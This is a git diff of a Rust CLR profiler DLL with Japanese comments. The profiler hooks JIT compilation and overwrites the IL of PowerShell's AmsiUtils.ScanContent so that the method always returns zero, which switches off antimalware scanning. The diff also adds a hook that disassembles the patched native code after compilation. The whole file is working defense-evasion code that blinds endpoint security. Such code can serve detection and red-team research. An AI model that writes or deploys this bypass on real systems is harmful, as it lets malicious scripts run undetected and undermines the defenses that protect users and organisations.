@@ -3,10 +3,12 @@ use std::sync::OnceLock;
 use windows::core::*;
 use windows::Win32::Foundation::{E_UNEXPECTED, MAX_PATH};
 use windows::Win32::System::Diagnostics::ClrProfiling::{
-    ICorProfilerCallback, ICorProfilerCallback2, ICorProfilerCallback2_Impl, ICorProfilerCallback3, ICorProfilerCallback3_Impl, ICorProfilerCallback4, ICorProfilerCallback4_Impl, ICorProfilerCallback5, ICorProfilerCallback5_Impl, ICorProfilerCallback_Impl, ICorProfilerInfo3, COR_PRF_MONITOR_ASSEMBLY_LOADS, COR_PRF_MONITOR_JIT_COMPILATION, COR_PRF_USE_PROFILE_IMAGES
+    ICorProfilerCallback, ICorProfilerCallback2, ICorProfilerCallback2_Impl, ICorProfilerCallback3, ICorProfilerCallback3_Impl, ICorProfilerCallback4, ICorProfilerCallback4_Impl, ICorProfilerCallback5, ICorProfilerCallback5_Impl, ICorProfilerCallback_Impl, ICorProfilerInfo3, COR_PRF_CODE_INFO, COR_PRF_MONITOR_ASSEMBLY_LOADS, COR_PRF_MONITOR_JIT_COMPILATION, COR_PRF_USE_PROFILE_IMAGES
 };
 use windows::Win32::System::Diagnostics::Debug::MAX_SYM_NAME;
 use windows::Win32::System::WinRT::Metadata::{IMetaDataImport2, IMAGE_COR_ILMETHOD, IMAGE_COR_ILMETHOD_FAT};
+
+use crate::util::Logger;
 
 // {5c8e9579-53b9-5a69-6a75-2d232518df35}
 pub const CLSID_PROFILER: GUID = GUID::from_values(
@@ -49,36 +51,7 @@ impl AchtungBabyProfiler {
     fn get_profiler_info(&self) -> Option<&ICorProfilerInfo3> {
         self.profiler_info.get()
     }
-}
-
-impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
-    fn Initialize(&self, picorprofilerinfounk: windows_core::Ref<'_, windows_core::IUnknown>) -> windows_core::Result<()> {
-        println!("[+] ICorProfilerCallback::Initialize");
-        // 引数として渡ってくるICorProfilerInfoをIUnknown経由で取得する
-        let profiler_info = picorprofilerinfounk.unwrap();
-        println!("[+] ICorProfilerInfo: {:?}", profiler_info);
-
-        self.set_profiler_info(profiler_info.cast::<ICorProfilerInfo3>()?)?;
-
-        println!("[+] get ICorProfilerInfo");
-        unsafe { self.get_profiler_info().unwrap().SetEventMask(
-            COR_PRF_MONITOR_ASSEMBLY_LOADS.0 as u32 | // アセンブリの読み込み通知を購読
-            COR_PRF_MONITOR_JIT_COMPILATION.0 as u32 |         // JITの開始通知を購読
-            COR_PRF_USE_PROFILE_IMAGES.0 as u32                // NGENにより予めJITコンパイルされたライブラリにおいてもJITコンパイルさせる
-        )? };
-
-        println!("[+] ICorProfilerInfo::SetEventMask");
-        Ok(())
-    }
-
-    fn Shutdown(&self) -> windows_core::Result<()> {
-        ("shutdown called");
-        // ICorProfilerInfoの解放
-        //*self.profiler_info.borrow_mut() = None;
-        Ok(())
-    }
-
-    fn JITCompilationStarted(&self, functionid: usize, _fissafetoblock: windows_core::BOOL) -> windows_core::Result<()> {
+    fn get_function_info(&self, functionid: usize) -> windows_core::Result<(String, u32)> {
         let mut ppimport:Option<IUnknown> = None; 
         let mut ptoken = 0_u32;  // GetMethodPropsに渡すようのメタデータトークン
         unsafe {
@@ -147,9 +120,42 @@ impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
         let class_filterd: Vec<u16> = sztypedef.into_iter().filter(|x| *x != 0).collect();
         let class_name = HSTRING::from_wide(&class_filterd);
 
-        if method_name == "ScanContent" {
-            // println!("sztypedef.szmethod: {}.{}", class_name, method_name);
+        Ok((format!("{}.{}", class_name, method_name), ptoken))
+    }
+}
 
+impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
+    fn Initialize(&self, picorprofilerinfounk: windows_core::Ref<'_, windows_core::IUnknown>) -> windows_core::Result<()> {
+        println!("[+] ICorProfilerCallback::Initialize");
+        // 引数として渡ってくるICorProfilerInfoをIUnknown経由で取得する
+        let profiler_info = picorprofilerinfounk.unwrap();
+        println!("[+] ICorProfilerInfo: {:?}", profiler_info);
+
+        self.set_profiler_info(profiler_info.cast::<ICorProfilerInfo3>()?)?;
+
+        println!("[+] get ICorProfilerInfo");
+        unsafe { self.get_profiler_info().unwrap().SetEventMask(
+            COR_PRF_MONITOR_ASSEMBLY_LOADS.0 as u32 | // アセンブリの読み込み通知を購読
+            COR_PRF_MONITOR_JIT_COMPILATION.0 as u32 |         // JITの開始通知を購読
+            COR_PRF_USE_PROFILE_IMAGES.0 as u32                // NGENにより予めJITコンパイルされたライブラリにおいてもJITコンパイルさせる
+        )? };
+
+        println!("[+] ICorProfilerInfo::SetEventMask");
+        Ok(())
+    }
+
+    fn Shutdown(&self) -> windows_core::Result<()> {
+        ("shutdown called");
+        // ICorProfilerInfoの解放
+        //*self.profiler_info.borrow_mut() = None;
+        Ok(())
+    }
+
+    fn JITCompilationStarted(&self, functionid: usize, _fissafetoblock: windows_core::BOOL) -> windows_core::Result<()> {
+        let (method_name, ptoken) = self.get_function_info(functionid)?;
+        let mut ptoken = ptoken;
+
+        if method_name == "System.Management.Automation.AmsiUtils.ScanContent" {
             let mut pclassid = 0_usize;
             let mut pmoduleid = 0_usize;
 
@@ -182,10 +188,10 @@ impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
 
             let fat_header_size = size_of::<IMAGE_COR_ILMETHOD_FAT>();
             let mut cloned_header = il_method.clone();
-            let new_il:[u8;6] = [
-                0x20, 0x00, // push 0 to stack top
-                0x20, 0x00, // push 0 to stack top
-                0x61,       // xor
+
+            // https://learn.microsoft.com/en-us/dotnet/api/system.reflection.emit.opcodes?view=net-9.0
+            let new_il:[u8;2] = [
+                0x16,  // push 0 to stack top
                 0x2a, // ret
             ];
 
@@ -210,6 +216,38 @@ impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
             };
         }
 
+        Ok(())
+    }
+
+    fn JITCompilationFinished(&self, functionid: usize, _hrstatus: windows_core::HRESULT, _fissafetoblock: windows_core::BOOL) -> windows_core::Result<()> {
+        let (method_name, _ptoken) = self.get_function_info(functionid)?;
+        if method_name != "System.Management.Automation.AmsiUtils.ScanContent" {
+            return Ok(());
+        }
+
+        let mut pccodeinfos = 0_u32;
+        let mut codeinfos: [COR_PRF_CODE_INFO;0] = [];
+
+        unsafe {
+            self.get_profiler_info().unwrap().GetCodeInfo2(
+                functionid, 
+                &mut pccodeinfos,
+                &mut codeinfos,
+            )?;
+        }
+
+        let mut codeinfos: [COR_PRF_CODE_INFO;1] = [Default::default()];
+
+        unsafe {
+            self.get_profiler_info().unwrap().GetCodeInfo2(
+                functionid, 
+                &mut pccodeinfos,
+                &mut codeinfos,
+            )?;
+        }
+
+        let bytes = unsafe { std::slice::from_raw_parts(codeinfos[0].startAddress as *const u8, codeinfos[0].size) };
+        Logger::show_disasm(bytes);
         Ok(())
     }
 
@@ -309,10 +347,6 @@ impl ICorProfilerCallback_Impl for AchtungBabyProfiler_Impl {
     }
 
     fn FunctionUnloadStarted(&self, _functionid: usize) -> windows_core::Result<()> {
-        Ok(())
-    }
-
-    fn JITCompilationFinished(&self, _functionid: usize, _hrstatus: windows_core::HRESULT, _fissafetoblock: windows_core::BOOL) -> windows_core::Result<()> {
         Ok(())
     }
 
